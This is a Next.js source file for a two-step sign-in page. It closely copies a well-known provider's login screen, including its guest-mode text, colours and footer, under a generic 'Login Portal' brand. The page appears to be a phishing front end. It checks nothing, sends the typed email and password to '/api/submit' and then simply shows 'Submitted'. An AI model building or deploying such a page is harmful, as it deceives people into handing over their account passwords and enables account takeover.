// File: app/page.js

'use client';

import { useState } from 'react';
import { Roboto } from 'next/font/google';

const roboto = Roboto({ weight: ['400'], subsets: ['latin'] });

export default function SignIn() {
  const [step, setStep] = useState(1);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (step === 1) {
      if (email.trim() !== '') {
        setStep(2);
      } else {
        alert('Please enter your email or username.');
      }
      return;
    }
    await fetch('/api/submit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password }),
    });
    alert('Submitted');
  };

  return (
    <main className={`${roboto.className} flex flex-col justify-between min-h-screen bg-[#111111] text-white`}>
      <div className="flex flex-col items-center justify-center grow w-full px-4">
        <div className="w-full max-w-4xl sm:flex sm:flex-row bg-[#1a1a1a] sm:rounded-2xl sm:shadow-xl sm:overflow-hidden">
          <div className="w-full sm:w-1/2 flex flex-col justify-start sm:justify-center p-6 sm:p-10">
            <div className="w-10 h-10 mb-6">
              <div className="h-10 w-10 rounded-full bg-[#84b4ff] text-black flex items-center justify-center text-lg font-bold">
                L
              </div>
            </div>
            {step === 1 && (
              <>
                <h1 className="text-2xl font-semibold mb-1">Login Portal</h1>
                <p className="text-sm text-gray-400 mb-6">Enter your details to begin</p>
              </>
            )}
            {step === 2 && (
              <>
                <h1 className="text-2xl font-semibold mb-1">Hi there</h1>
                <p className="text-sm text-white break-words">{email}</p>
              </>
            )}
          </div>

          <form
            onSubmit={handleSubmit}
            className="w-full sm:w-1/2 px-6 py-6 sm:px-10 sm:py-10"
          >
            {step === 1 && (
              <>
                <label className="text-sm text-gray-300">Email address</label>
                <input
                  type="email"
                  required
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full mt-1 px-4 py-3 bg-[#111111] border border-[#8e918f] rounded text-white focus:outline-none focus:border-[#84b4ff]"
                />
                <div className="text-sm text-[#84b4ff] mt-2 mb-8 cursor-pointer hover:underline">
                  Trouble logging in?
                </div>
                <p className="text-sm text-gray-500 mb-2">
                  Using a shared computer? Try guest access.<br />
                  <a href="#" className="text-[#84b4ff] hover:underline">
                    Learn about guest mode
                  </a>
                </p>
                <div className="flex justify-between items-center mt-8">
                  <a href="#" className="text-sm text-[#84b4ff] hover:underline">Create account</a>
                  <button
                    type="submit"
                    className="bg-[#84b4ff] text-black text-sm px-6 py-2 rounded-full hover:bg-[#6aa0f0]"
                  >
                    Login
                  </button>
                </div>
              </>
            )}

            {step === 2 && (
              <>
                <label className="text-sm text-gray-300">Password</label>
                <input
                  type={showPassword ? 'text' : 'password'}
                  required
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full mt-1 px-4 py-3 bg-[#111111] border border-[#8e918f] rounded text-white focus:outline-none focus:border-[#84b4ff]"
                />
                <div className="mt-3 mb-8">
                  <label className="text-sm text-gray-400">
                    <input
                      type="checkbox"
                      className="mr-2"
                      onChange={() => setShowPassword(!showPassword)}
                    />
                    Show password
                  </label>
                </div>
                <div className="flex justify-between items-center">
                  <button
                    type="button"
                    onClick={() => setStep(1)}
                    className="text-sm text-[#84b4ff] hover:underline"
                  >
                    ← Back
                  </button>
                  <button
                    type="submit"
                    className="bg-[#84b4ff] text-black text-sm px-6 py-2 rounded-full hover:bg-[#6aa0f0]"
                  >
                    Submit
                  </button>
                </div>
              </>
            )}
          </form>
        </div>

        <div className="flex justify-between items-center w-full max-w-4xl px-6 pt-10 text-xs text-gray-400">
          <div>
            <select className="bg-transparent text-white border-none focus:outline-none">
              <option>English (US)</option>
            </select>
          </div>
          <div className="flex space-x-4">
            <a href="#" className="hover:underline">Support</a>
            <a href="#" className="hover:underline">Privacy</a>
            <a href="#" className="hover:underline">Terms</a>
          </div>
        </div>
      </div>
    </main>
  );
}
